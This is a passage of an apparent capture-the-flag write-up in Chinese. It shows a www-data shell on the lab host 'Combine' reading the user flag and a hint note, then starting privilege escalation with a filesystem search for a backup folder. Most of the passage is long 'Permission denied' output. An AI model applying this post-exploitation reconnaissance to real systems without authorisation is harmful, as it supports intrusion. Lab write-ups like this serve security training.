+</span></span><span class=line><span class=cl>note.txt  user.txt
+</span></span><span class=line><span class=cl>www-data@Combine:/home/dashamao$ cat user.txt
+</span></span><span class=line><span class=cl>cat user.txt
+</span></span><span class=line><span class=cl>flag<span class=o>{</span>user-4682ce07477fb95a0d4a9f84856ee52c<span class=o>}</span>
+</span></span></code></pre></div><p>接下来是提权</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@Combine:/home/dashamao$ id   
+</span></span><span class=line><span class=cl>id
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span>
+</span></span><span class=line><span class=cl>www-data@Combine:/home/dashamao$ ls
+</span></span><span class=line><span class=cl>ls
+</span></span><span class=line><span class=cl>note.txt  user.txt
+</span></span><span class=line><span class=cl>www-data@Combine:/home/dashamao$ cat note.txt
+</span></span><span class=line><span class=cl>cat note.txt
+</span></span><span class=line><span class=cl>check backup folder
+</span></span></code></pre></div><p>这里提到存在一个后门，hhh</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@Combine:/$ find / -name backups
+</span></span><span class=line><span class=cl>find / -name backups
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/root&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/run/sudo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/run/credentials&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/run/systemd/unit-root&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/run/systemd/inaccessible/dir&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/sys/kernel/tracing&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/sys/kernel/debug&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/sys/fs/pstore&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/sys/fs/bpf&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/lost+found&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/tty/driver&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/1/task/1/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/1/task/1/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/1/task/1/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/1/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/1/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/1/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/1/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/2/task/2/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/2/task/2/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/2/task/2/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/2/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/2/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/2/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/2/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/3/task/3/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/3/task/3/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/3/task/3/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/3/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/3/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/3/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/3/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/4/task/4/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/4/task/4/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/4/task/4/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/4/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/4/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/4/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/4/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/6/task/6/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/6/task/6/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/6/task/6/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/6/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/6/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/6/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/6/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/7/task/7/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/7/task/7/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/7/task/7/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/7/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/7/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/7/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/7/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/8/task/8/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/8/task/8/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/8/task/8/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/8/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/8/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/8/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/8/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/9/task/9/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/9/task/9/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/9/task/9/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/9/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/9/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/9/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/9/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/10/task/10/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/10/task/10/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/10/task/10/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/10/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/10/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/10/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/10/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/11/task/11/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/11/task/11/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/11/task/11/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/11/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/11/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/11/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/11/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/12/task/12/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/12/task/12/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/12/task/12/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/12/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/12/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/12/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/12/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/14/task/14/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/14/task/14/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/14/task/14/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/14/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/14/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/14/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/14/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/15/task/15/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/15/task/15/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/15/task/15/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/15/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/15/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/15/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/15/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/16/task/16/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/16/task/16/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/16/task/16/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/16/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/16/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/16/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/16/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/17/task/17/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/17/task/17/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/17/task/17/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/17/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/17/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/17/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/17/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/18/task/18/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/18/task/18/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/18/task/18/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/18/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/18/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/18/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/18/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/19/task/19/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/19/task/19/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/19/task/19/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/19/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/19/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/19/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/19/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/20/task/20/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/20/task/20/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/20/task/20/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/20/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/20/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/20/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/20/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/21/task/21/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/21/task/21/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/21/task/21/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/21/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/21/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/21/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/21/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/22/task/22/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/22/task/22/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/22/task/22/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/22/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/22/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/22/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/22/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/23/task/23/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/23/task/23/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/23/task/23/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/23/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/23/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/23/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/23/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/24/task/24/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/24/task/24/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/24/task/24/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/24/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/24/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/24/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/24/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/25/task/25/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/25/task/25/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/25/task/25/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/25/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/25/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/25/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/25/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/26/task/26/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/26/task/26/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/26/task/26/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/26/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/26/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/26/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/26/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/27/task/27/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/27/task/27/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/27/task/27/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/27/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/27/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/27/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/27/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/28/task/28/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/28/task/28/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/28/task/28/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/28/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/28/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/28/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/28/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/29/task/29/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/29/task/29/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/29/task/29/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/29/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/29/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/29/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/29/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/30/task/30/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/30/task/30/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/30/task/30/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/30/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/30/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/30/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/30/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/48/task/48/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/48/task/48/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/48/task/48/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/48/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/48/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/48/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/48/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/49/task/49/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/49/task/49/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/49/task/49/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/49/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/49/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/49/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/49/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/50/task/50/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/50/task/50/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/50/task/50/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/50/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/50/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/50/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/50/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/59/task/59/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/59/task/59/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/59/task/59/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/59/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/59/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/59/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/59/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/100/task/100/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/100/task/100/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/100/task/100/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/100/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/100/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/100/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/100/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/105/task/105/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/105/task/105/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/105/task/105/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/105/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/105/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/105/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/105/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/106/task/106/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/106/task/106/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/106/task/106/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/106/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/106/map_files&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/106/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/106/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/108/task/108/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/108/task/108/fdinfo&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/108/task/108/ns&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/108/fd&#39;</span>: Permission denied
+</span></span><span class=line><span class=cl>find: <span class=s1>&#39;/proc/108/map_files&#39;</span>: Permission denied
